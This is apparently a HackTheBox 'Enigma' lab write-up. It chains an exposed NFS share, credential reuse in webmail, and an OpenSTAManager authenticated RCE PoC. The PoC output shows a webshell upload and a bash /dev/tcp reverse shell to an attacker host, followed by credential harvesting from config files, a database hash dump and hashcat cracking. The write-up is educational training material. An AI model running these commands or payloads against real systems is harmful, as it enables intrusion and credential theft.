# HackTheBox – Enigma Writeup

| | |
|---|---|
| **Platform** | Hack The Box |
| **Room** | Enigma |
| **Target IP** | <TARGET_IP> |
| **Domain** | enigma.htb |
| **Difficulty** | Easy |
| **Category** | Linux / Web (OpenSTAManager) |
| **Date completed** | 2026-11-24 |
| **Author** | _your handle_ |

> **Disclaimer:** This writeup is for educational purposes only, written after completing the HackTheBox "Enigma" machine in an authorized lab environment. Flags are redacted.

## Summary

Enigma is a Linux box built around an NFS misconfiguration that leaks a new-employee onboarding PDF containing webmail credentials. Reusing those credentials across mailboxes (Kevin → Sarah) exposes further credentials for an OpenSTAManager instance, which is vulnerable to an authenticated RCE (CVE-2026-38751). The resulting `www-data` shell leads to a hardcoded database password in `config.inc.php`, whose user table yields a crackable password hash for the user `haris`, giving a foothold and the user flag.

## Tools Used

- `nmap` – port/service enumeration
- `gobuster` – web directory brute force (no useful results)
- `showmount` / `mount` (NFS)
- Webmail client (Roundcube-style) for Kevin/Sarah mailbox access
- OpenSTAManager RCE PoC for CVE-2026-38751
- `mysql` client
- `hashcat` (mode 3200, bcrypt) with `rockyou.txt`

## 1. Reconnaissance

Full TCP port scan:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind  2-4 (RPC #100000)
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
2049/tcp  open  nfs_acl  3 (RPC #100227)
34851/tcp open  mountd   1-3 (RPC #100005)
38275/tcp open  mountd   1-3 (RPC #100005)
41601/tcp open  status   1 (RPC #100024)
46373/tcp open  nlockmgr 1-4 (RPC #100021)
54665/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Findings:**
- Port 80 redirects to `http://enigma.htb/` → added `enigma.htb` to `/etc/hosts`.
- Mail stack present (POP3/IMAP, plain and TLS) via Dovecot → webmail is likely reachable once a vhost/subdomain is found.
- RPC/NFS services exposed (111, 2049, mountd, etc.) → worth checking for exported shares.

## 2. Enumeration

### 2.1 Web directory brute force

```bash
gobuster dir -u 'http://enigma.htb/' -w /usr/share/wordlists/dirb/common.txt --exclude-length 915
```

No useful results — nothing of value turned up on the base vhost with the common wordlist.

### 2.2 NFS shares

Checked for NFS exports instead:

```bash
showmount enigma.htb
# Hosts on enigma.htb: (empty)

showmount -e enigma.htb
```

```
Export list for enigma.htb:
/srv/nfs/onboarding *
```

An exported share, world-mountable (`*`), was found: `/srv/nfs/onboarding`.

### 2.3 Mounting the share

```bash
mkdir -p /mount
mount -t nfs enigma.htb:/srv/nfs/onboarding /mount
ls /mount
```

```
New_Employee_Access.pdf
```

Opened `New_Employee_Access.pdf` in the browser:
![New Employee onboarding PDF with Kevin Mitchell's webmail credentials](images/enigma/01-onboarding-pdf.png)

**Leaked credentials:**

| Field | Value |
|---|---|
| Webmail URL | `http://mail001.enigma.htb` |
| Username | `kevin` |
| Password | `Enigma2024!` |

Added `mail001.enigma.htb` to `/etc/hosts` as well.

### 3.1 Kevin's mailbox

Logged into the webmail portal at `http://mail001.enigma.htb` with Kevin's credentials from the PDF. Inside, found a welcome email from Sarah (Accounts department):

![Kevin's mailbox showing the onboarding email from Sarah](images/enigma/02-kevin-mailbox-sarah-email.png)

The email itself contained no credentials, but confirmed `sarah@enigma.htb` as a valid user.

### 3.2 Credential reuse → Sarah's mailbox

Tried logging into Sarah's mailbox using **Kevin's password** (`Enigma2024!`) — password reuse across accounts worked, granting access to `sarah`.

### 3.3 OpenSTAManager credentials

Inside Sarah's mailbox was a reply from IT Support containing admin credentials for an internal support portal:

![Sarah's mailbox showing IT's reply with OpenSTAManager admin credentials](images/enigma/03-sarah-mailbox-openstamanager-creds.png)

| Field | Value |
|---|---|
| URL | `http://support_001.enigma.htb` |
| Username | `admin` |
| Password | `Ne3s4rtars78s` |

Added `support_001.enigma.htb` to `/etc/hosts` and logged in. The portal was running **OpenSTAManager v2.9.8**.

## 4. Exploitation — CVE-2026-38751 (OpenSTAManager RCE)

OpenSTAManager 2.9.8 is vulnerable to an authenticated remote code execution, tracked as **CVE-2026-38751**, with a public PoC on GitHub.

```bash
./openstamanager-rce-exploit \
  --url http://support_001.enigma.htb \
  -U admin -P Ne3s4rtars78s \
  --lhost <ATTACKER_IP> --lport 4444
```

```
[ OpenSTAManager RCE Exploit : ]

Target: http://support_001.enigma.htb/
[*] Step 1: Login...
[+] Login successful: admin
[*] Step 2: Enable updates...
[+] Updates enabled
[*] Step 3: Create ZIP...
[*] Created in-memory ZIP file
[*] Shell location: /modules/shell/shell.php
[*] Step 4: Upload...
[*] Upload status: 500 Internal Server Error
[+] Upload successful
[*] Step 5: Verify...
[+] Vulnerability confirmed!
[+] Shell: http://support_001.enigma.htb/modules/shell/shell.php
[+] Test: http://support_001.enigma.htb/modules/shell/shell.php?c=whoami
[*] Listening on <ATTACKER_IP>:4444...
[*] Trying payload: bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
[-] Payload failed: operation timed out
[*] Trying payload: python3 -c '...reverse shell...'
[-] Payload failed: operation timed out
[*] Trying payload: python -c '...reverse shell...'
[+] Payload sent successfully. Waiting for connection...
[+] Connection received from <TARGET_IP>:36948
[*] Reverse shell established.
```

The PoC logged in as admin, abused OpenSTAManager's update/plugin mechanism to upload a PHP webshell (`modules/shell/shell.php`), then used it to trigger a `python` reverse shell back to the attacking host (the `bash` and `python3` one-liners timed out, but the `python` one succeeded).

Stabilized the shell:

```bash
script /dev/null -c bash
```

```
www-data@enigma:~/html/openstamanager$
```

## 5. Privilege Escalation — www-data → haris

### 5.1 Enumerating local users

```bash
cat /etc/passwd
```

Of the listed accounts, `haris` was the only non-service user with a real login shell (`/bin/bash`), making it the next target:

```
haris:x:1000:1000:,,,:/home/haris:/bin/bash
kevin:x:1001:1001::/home/kevin:/usr/sbin/nologin
sarah:x:1002:1002::/home/sarah:/usr/sbin/nologin
it:x:1003:1003::/home/it:/usr/sbin/nologin
```

### 5.2 Database credentials from application config

```bash
cat config.inc.php
```

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

### 5.3 Dumping application users

```bash
mysql -u brollin -p'Fri3nds@9099'
```

```sql
show databases;
use openstamanager;
show tables;
select * from zz_users;
```

```
+----+----------+--------------------------------------------------------------+------------------+
| id | username | password                                                     | email            |
+----+----------+--------------------------------------------------------------+------------------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |
+----+----------+--------------------------------------------------------------+------------------+
```

The `haris` row gives a bcrypt hash (`$2y$...`) tied to the OS account of the same name.

### 5.4 Cracking the hash

```bash
hashcat -m 3200 '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' /usr/share/wordlists/rockyou.txt
```

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

Cracked password: `bestfriends`

### 5.5 Switching user and reading the flag

```bash
su haris
Password: bestfriends
```

```
haris@enigma:/var/www/html/openstamanager/modules/shell$ cd /home/haris
haris@enigma://home/haris$ ls
mail  user.txt
haris@enigma://home/haris$ cat user.txt
```

**user.txt:** `[REDACTED]`

(Note: the OpenSTAManager password for `admin` reused as the site-wide pattern did not apply here — `haris`'s password was independently crackable from rockyou.txt, suggesting weak/reused personal password hygiene rather than a shared company password.)
